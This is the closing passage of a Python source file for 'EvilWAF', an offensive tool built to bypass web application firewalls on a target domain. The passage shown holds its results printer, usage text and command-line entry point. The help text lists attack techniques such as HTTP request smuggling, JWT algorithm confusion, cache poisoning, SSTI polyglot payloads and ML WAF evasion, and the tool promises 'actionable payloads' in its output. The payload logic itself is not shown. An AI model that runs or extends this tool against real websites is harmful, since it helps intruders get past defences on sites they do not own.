            status_icon = "[+]" if success_count > 0 else "[-]"
            
            print(f"{status_color}{status_icon} {method.upper():<20} : {success_count:>2} successful bypasses{Colors.END}")
        
        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
        print(f"{Colors.GREEN}[*] TOTAL TECHNIQUES: {technique_count}{Colors.END}")
        print(f"{Colors.GREEN}[*] SUCCESSFUL BYPASSES: {total_success}{Colors.END}")
        
        if total_success > 0:
            print(f"{Colors.GREEN}[*] FIREWALL BYPASS SUCCESSFUL!{Colors.END}")
            print(f"{Colors.GREEN}[*] Check results.json for actionable payloads{Colors.END}")
        else:
            print(f"{Colors.RED}[!] No bypass methods succeeded{Colors.END}")

   
def show_usage():
    usage = f"""
{Colors.WHITE}
EVILWAF v2.2
------------

{Colors.WHITE}Usage:{Colors.END}
  python3 evilwaf.py -d website.com -o results.json (Recommended)
  python3 evilwaf.py -d https://example.com -o results.json (Recommended)
  python3 evilwaf.py -d https://target.com
  python3 evilwaf.py -d target.com
  python3 evilwaf.py -d www.target.com

{Colors.WHITE}Options:{Colors.END}
  -d, --domain    Target domain (required) - supports all formats
  -o, --output    Save results to JSON file
  -h, --help      Show this help message
  -u, --update    Update EvilWAF


{Colors.WHITE}Techniques:{Colors.END}
  Critical risk: Direct Exploitation
  • HTTP Request Smuggling
  •JWT Algorithm Confusion
  •HTTP/2 Stream Multiplexing
  •WebAssembly Memory Corruption
  •cache poisoning
  •web cache poisoning
  
  High risk: Potential Exploitation
  •SSTI Polyglot Payloads
  •gRPC/Protobuf Bypass
  •GraphQL Query Batching
  °ML WAF Evasion
  
  Medium risk: Information Gathering 
  ° Subdomain Discovery
  ° DNS History Bypass  
  ° Header Manipulation
  ° Advanced Protocol Attacks


{Colors.WHITE}Examples:{Colors.END}
  python3 evilwaf.py -d target.com -o results.json (Recommended)
  python3 evilwaf.py -d example.com
  python3 evilwaf.py -d https://website.com -o results.json (Recommended)
  python3 evilwaf.py -d www.target.com
{Colors.END}
"""
    print(usage)

def main():
    parser = argparse.ArgumentParser(description='EVILWAF v2.0 - Advanced Firewall Bypass', add_help=False)
    parser.add_argument('-d', '--domain', help='Target domain to bypass (supports all formats)')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-u', '--update', action='store_true', help='Update EvilWAF')  
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    
    args = parser.parse_args()
    
    if args.update:
        updater()
        quit()  
     
    if args.help or not args.domain:
        show_banner()
        show_usage()
        sys.exit(0)
    
    show_banner()
    
    # Test URL normalization
    tool = EvilWAFBypass()
    normalized = tool.normalize_domain(args.domain)
    print(f"{Colors.GREEN}[+] Target: {args.domain} -> Normalized: {normalized}{Colors.END}")
    
    try:
        results = asyncio.run(tool.ultimate_bypass(args.domain, args.output))
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    main()



